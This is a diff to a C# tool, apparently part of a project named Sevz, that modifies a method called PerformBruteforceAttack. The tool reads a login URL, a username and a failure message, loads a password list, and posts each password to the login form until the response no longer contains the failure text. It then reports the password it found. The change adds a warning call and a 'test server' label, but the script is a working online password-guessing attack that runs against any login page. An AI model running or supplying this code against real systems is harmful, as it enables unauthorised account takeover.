@@ -5,7 +5,9 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Text.Json;
+using System.IO;
 using static Sevz.Models.info;
+using Sevz.Models;
 
 namespace Sevz.Services
 {
@@ -13,19 +15,21 @@ namespace Sevz.Services
     {
         public static async Task PerformBruteforceAttack(string[] args)
         {
+            info.AlertWarning();
             // 로그인 URL 입력 받기
-            Console.Write("Enter the login URL: ");
+            Console.Write("Enter the login URL (test server): ");
             string loginUrl = Console.ReadLine();
 
             // 사용자 이름 입력 받기
             Console.Write("Enter the username: ");
             string username = Console.ReadLine();
 
-            // 비밀번호 리스트가 들어있는 JSON 파일 경로
-            string passwordFilePath = "Configurations/passwordex.json";
+            // 실패 메시지를 입력 받음 (예: "Invalid" or "Login failed")
+            Console.Write("Enter the failure message to look for (e.g., 'Invalid'): ");
+            string failureMessage = Console.ReadLine();
 
-            // 비밀번호 리스트 불러오기
-            List<string> passwordList = LoadPasswordList(passwordFilePath);
+            // 비밀번호 리스트가 들어있는 JSON 파일 경로 
+            List<string> passwordList = PasswordManager.LoadPasswords();
 
             if (passwordList == null || passwordList.Count == 0)
             {
@@ -41,9 +45,9 @@ namespace Sevz.Services
                     // 로그인 폼 데이터 설정
                     var postData = new FormUrlEncodedContent(new[]
                     {
-                    new KeyValuePair<string, string>("username", username),
-                    new KeyValuePair<string, string>("password", password)
-                });
+                        new KeyValuePair<string, string>("username", username),
+                        new KeyValuePair<string, string>("password", password)
+                    });
 
                     // POST 요청을 통해 로그인 시도
                     HttpResponseMessage response = await client.PostAsync(loginUrl, postData);
@@ -51,8 +55,8 @@ namespace Sevz.Services
 
                     Console.WriteLine($"Trying password: {password}");
 
-                    // 서버 응답에서 "로그인 실패" 또는 "Invalid" 같은 문자열이 없으면 성공으로 간주
-                    if (response.IsSuccessStatusCode && !resultContent.Contains("Invalid"))
+                    // 서버 응답에서 실패 메시지가 없으면 성공으로 간주
+                    if (response.IsSuccessStatusCode && !resultContent.Contains(failureMessage))
                     {
                         Console.WriteLine($"Password found: {password}");
                         break;
